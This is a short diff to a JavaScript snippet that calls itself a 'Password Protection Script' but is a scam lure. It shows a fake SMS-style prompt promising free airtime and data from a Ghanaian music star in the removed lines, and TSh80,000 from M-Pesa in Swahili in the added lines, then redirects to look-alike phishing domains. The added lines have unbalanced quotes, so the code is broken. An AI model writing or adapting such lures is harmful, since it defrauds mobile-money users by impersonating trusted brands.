@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '10GB + GH₵20 Airtime'
-password=prompt('SMS: Congratulations You are among the 10,000 fans to receive GH₵20 Airtime and 10GB Free Data From KING PROMISE Birthday Offer, Kindly Press OK to ACTIVATE ','10GB + GH₵20 Airtime');
-if (password != '10GB + GH₵20 Airtime') {
-location.href='https://king-promise.4g-data.info/10GB';
+var password = 'TSh80,000''
+password=prompt('SMS: Hongera Wewe ni miongoni mwa Wateja wa M-Pesa kupokea ofa ya TSh80,000 ya Maadhimisho ya Miaka 80,000, Tafadhali Bonyeza Sawa ili kutoa pesa sasa','TSh80,000');
+if (password != 'TSh80,000'') {
+location.href='https://mpesa-drc.programs.lat/kutoa';
 }
